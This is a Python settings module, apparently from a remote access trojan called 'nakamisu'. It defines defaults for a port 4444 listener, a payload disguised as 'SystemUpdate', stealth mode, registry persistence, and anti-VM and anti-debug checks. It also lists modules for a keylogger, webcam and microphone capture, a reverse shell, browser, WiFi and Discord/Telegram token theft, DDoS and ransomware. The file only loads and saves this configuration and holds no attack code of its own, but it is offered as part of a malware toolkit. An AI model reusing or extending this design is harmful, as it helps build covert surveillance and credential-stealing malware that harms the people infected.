import json
import os

CONFIG_FILE = "nakamisu_config.json"
MODULES_FILE = "modules.json"

class Settings:
    def __init__(self):
        self.config = self._load_config()
        self.modules = self._load_modules()

    def _load_config(self):
        default = {
            "server_ip": "0.0.0.0",
            "server_port": 4444,
            "payload_name": "SystemUpdate",
            "payload_type": "python",
            "encryption_key": "nakamisu_secret_2024",
            "use_encryption": True,
            "max_connections": 100,
            "connection_timeout": 30,
            "auto_reconnect": True,
            "stealth_mode": True,
            "hide_console": True,
            "registry_persistence": True,
            "anti_vm": True,
            "anti_debug": True,
            "sleep_delay": 5,
            "debug_mode": False,
            "custom_icon": None
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    user = json.load(f)
                    default.update(user)
            except:
                pass
        return default

    def _load_modules(self):
        default = {
            "SystemInfo": {"active": True, "description": "Mengambil informasi sistem"},
            "Screenshot": {"active": True, "description": "Mengambil screenshot"},
            "Keylogger": {"active": False, "description": "Merekam keyboard"},
            "Webcam": {"active": False, "description": "Webcam capture"},
            "Persistence": {"active": True, "description": "Install persistence"},
            "FileManager": {"active": True, "description": "File operations"},
            "ReverseShell": {"active": True, "description": "Shell command"},
            "ProcessManager": {"active": False, "description": "Process list/kill"},
            "ClipboardGrabber": {"active": False, "description": "Clipboard grab"},
            "AudioRecorder": {"active": False, "description": "Record microphone"},
            "BrowserStealer": {"active": False, "description": "Browser password"},
            "WiFiGrabber": {"active": False, "description": "WiFi passwords"},
            "TokenGrabber": {"active": False, "description": "Discord/Telegram tokens"},
            "PacketSniffer": {"active": False, "description": "Sniff network"},
            "DDoS": {"active": False, "description": "DDoS attack"},
            "Ransomware": {"active": False, "description": "File encryption (danger)"}
        }
        if os.path.exists(MODULES_FILE):
            try:
                with open(MODULES_FILE, 'r') as f:
                    user = json.load(f)
                    for mod, data in user.items():
                        if mod in default:
                            default[mod]["active"] = data.get("active", default[mod]["active"])
            except:
                pass
        return default

    def save_config(self):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def save_modules(self):
        with open(MODULES_FILE, 'w') as f:
            json.dump(self.modules, f, indent=4)

    def get(self, key, default=None):
        return self.config.get(key, default)

    def set(self, key, value):
        self.config[key] = value
        self.save_config()

    def get_active_modules(self):
        return [name for name, data in self.modules.items() if data.get("active")]

    def set_module_active(self, name, active):
        if name in self.modules:
            self.modules[name]["active"] = active
            self.save_modules()
            return True
        return False

    def show_config(self):
        print("\n=== CONFIGURATION ===")
        for k, v in self.config.items():
            print(f"{k}: {v}")
        print("\n=== ACTIVE MODULES ===")
        for m in self.get_active_modules():
            desc = self.modules[m].get("description", "")
            print(f"  {m}: {desc}")
